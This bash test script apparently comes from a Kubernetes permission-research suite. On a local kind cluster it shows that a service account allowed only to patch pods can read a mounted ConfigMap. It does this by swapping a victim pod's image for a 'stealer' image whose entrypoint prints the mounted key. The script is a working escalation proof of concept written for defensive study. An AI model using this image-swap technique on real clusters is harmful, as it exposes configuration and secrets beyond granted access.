#!/usr/bin/env bash
# Implicit permission: patch Pod (image swap) -> get ConfigMap  (pod-patch-image-reads-configmap)
#
# Proof: an identity granted ONLY `patch pods` (plus get pods) but NOT `get
# configmaps`, NOT `create pods`, NOT `pods/exec` can read a ConfigMap a
# *pre-existing* Pod mounts -- by replacing that Pod's container image (the one
# Pod-spec field ValidatePodUpdate lets you mutate) with an attacker-controlled
# image. The kubelet recreates the container in place, re-using the ConfigMap
# volume, so attacker code runs with the ConfigMap bytes on its filesystem.
#
# ConfigMap analogue of pod-patch-image-reads-secret.sh; the REACHABLE sibling of
# pod-update-reads-configmap.sh (adding a new ref by patch is forbidden by Pod
# immutability -- that test proves the wall; the image swap needs no new ref).
# Mechanism: ../transitions/pod-patch-image-reads-configmap.md
#   when: resource1.namespace == resource.namespace
#         && resource1.configMapRefs.contains(configmap.name)
source "$(dirname "$0")/../lib.sh"
test_start "pod-patch-image-reads-configmap"

command -v docker >/dev/null 2>&1 || { printf 'RESULT: SKIP %s %s\n' "$_TESTNAME" "docker not available to build the attacker image"; exit 3; }
command -v kind   >/dev/null 2>&1 || { printf 'RESULT: SKIP %s %s\n' "$_TESTNAME" "kind not available to load the attacker image onto the node"; exit 3; }
CLUSTER="${CTX#kind-}"          # context kind-wp-e2e -> cluster wp-e2e
SLEEPER="wp-e2e-sleeper:1"; STEALER="wp-e2e-stealer-cm:1"

step "build + load a benign 'sleeper' and a configmap 'stealer' image onto the node"
_bdir="$(mktemp -d "${TMPDIR:-/tmp}/wp-patch-cm.XXXXXX")"; trap 'rm -rf "$_bdir"' RETURN
printf 'FROM %s\nENTRYPOINT ["sleep","3600"]\n' "$IMG" > "$_bdir/Dockerfile.sleeper"
# The stealer's entrypoint reads the mounted ConfigMap and prints it (observed via
# admin `kubectl logs` below -- the attacker identity holds no pods/log, and a
# real attacker would exfiltrate from its own in-pod code).
printf 'FROM %s\nENTRYPOINT ["sh","-c","echo WPSTOLEN:$(cat /mnt/cm/key 2>/dev/null); sleep 3600"]\n' "$IMG" > "$_bdir/Dockerfile.stealer"
docker build -q -t "$SLEEPER" -f "$_bdir/Dockerfile.sleeper" "$_bdir" >/dev/null 2>&1 || fail "could not build sleeper image"
docker build -q -t "$STEALER" -f "$_bdir/Dockerfile.stealer" "$_bdir" >/dev/null 2>&1 || fail "could not build stealer image"
kind load docker-image "$SLEEPER" "$STEALER" --name "$CLUSTER" >/dev/null 2>&1 || fail "could not load images onto kind node"

ns="$(new_ns pod-patch-cm)"
cm_val="cfg${RUN_ID}"

# Pre-existing state (ADMIN authors it): a ConfigMap the attacker must never
# `get`, and a NORMAL running Pod that mounts it. The attacker did not create it.
step "admin creates ConfigMap 'target' and a running Pod 'victim' that mounts it"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null \
  || fail "could not create target configmap"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create victim pod"
apiVersion: v1
kind: Pod
metadata: { name: victim }
spec:
  automountServiceAccountToken: false
  containers:
  - name: c
    image: ${SLEEPER}
    imagePullPolicy: IfNotPresent
    volumeMounts: [{ name: cm, mountPath: /mnt/cm, readOnly: true }]
  volumes:
  - name: cm
    configMap: { name: target }
EOF
wait_pod_running "$ns" victim 90

# Attacker identity: ONLY `patch pods` (+ get pods). NOT get configmaps, NOT
# create pods, NOT pods/exec, NOT pods/log.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "pods" "patch,get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: holds p (patch pods) but not q (get configmaps) and no other read path.
assert_can    "$subj" patch  pods       "$ns"
assert_cannot "$subj" get    configmaps "$ns"
assert_cannot "$subj" create pods       "$ns"
assert_cannot "$subj" create pods/exec  "$ns"

# WHY THE IMAGE IS THE LEVER: adding a *new* ConfigMap ref by patch is rejected
# by Pod immutability (the add-a-ref path, see pod-update-reads-configmap) ...
step "attacker's add-a-ref patch is rejected (Pod immutability -- the unreachable path)"
err="$(as_subj "$subj" -n "$ns" patch pod victim --type=json -p \
  '[{"op":"add","path":"/spec/volumes/-","value":{"name":"cm2","configMap":{"name":"target"}}}]' 2>&1)" && \
  fail "add-a-ref patch unexpectedly succeeded -- revisit the mechanism split"
assert_contains "$err" "Forbidden" "add-a-ref patch is forbidden by ValidatePodUpdate"

# ... but replacing spec.containers[*].image IS allowed, and needs no new ref.
# ACT (as attacker, exercising ONLY p): swap the image to the stealer.
step "attacker swaps the container image to '$STEALER' via patch pods"
as_subj "$subj" -n "$ns" patch pod victim --type=json \
  -p "[{\"op\":\"replace\",\"path\":\"/spec/containers/0/image\",\"value\":\"$STEALER\"}]" >/dev/null \
  || fail "attacker could not patch the container image"

# EFFECT: the kubelet recreated the container from the attacker's image, which
# ran with the ConfigMap still mounted and read it. Observed as admin via logs
# (the attacker holds no pods/log; a real attacker exfiltrates from its own code).
step "waiting for the stealer container to come up and read the mounted ConfigMap"
got=""
for i in $(seq 1 40); do
  img="$(K -n "$ns" get pod victim -o jsonpath='{.status.containerStatuses[0].image}' 2>/dev/null)"
  case "$img" in *"$STEALER") got="$(K -n "$ns" logs victim 2>/dev/null | sed -n 's/^WPSTOLEN://p' | head -1)";; esac
  [ -n "$got" ] && break
  sleep 2
done
assert_eq "$got" "$cm_val" "attacker-controlled image read the mounted ConfigMap (via patch pods image swap)"
step "patch pods swapped the image; attacker code read the ConfigMap ($got) with no 'get configmaps'"

test_pass
